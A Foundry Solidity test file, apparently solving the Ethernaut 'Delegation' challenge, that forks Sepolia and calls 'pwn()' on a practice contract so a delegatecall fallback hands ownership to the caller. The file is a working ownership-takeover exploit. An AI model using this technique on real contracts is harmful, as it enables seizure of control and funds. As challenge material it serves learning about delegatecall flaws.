// test/Delegation.t.sol
pragma solidity ^0.8.19;

import "forge-std/Test.sol";

interface IDelegation {
    function owner() external view returns (address);
}

interface IDelegate {
    function pwn() external;
}

contract DelegationTest is Test {
    IDelegation private delegation = IDelegation(0xB2f6aA41C53899669fa3FE4D281e1362Df892BFf);
    address private me = address(this);

    function setUp() public {
        vm.createSelectFork("sepolia");
    }

    function test_DelegationExploit() public {
        bytes memory payload = abi.encodeWithSignature("pwn()");
        (bool success,) = address(delegation).call(payload);
        assertTrue(success, "Low-level pwn() call failed");
        assertEq(delegation.owner(), me, "Owner was not changed to me");
    }
}
